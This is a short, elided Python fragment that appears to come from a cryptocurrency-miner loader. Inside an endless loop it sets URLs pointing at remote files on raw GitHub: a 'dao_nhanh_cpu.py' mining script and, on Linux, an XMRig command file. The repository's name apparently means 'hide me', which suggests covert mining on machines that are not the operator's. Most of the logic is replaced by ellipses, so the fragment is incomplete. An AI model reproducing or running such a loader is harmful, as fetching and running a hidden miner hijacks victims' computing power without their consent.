...
while True:
    ...
    link_dao = 'https://raw.githubusercontent.com/rolandmedina54/giautoidi/beta/daonhanh/dao_nhanh_cpu.py'
    try:
    ...
    if operate_system == 'lin':
        ...
        link_command_xmrig = 'https://raw.githubusercontent.com/rolandmedina54/giautoidi/beta/daonhanh/test'
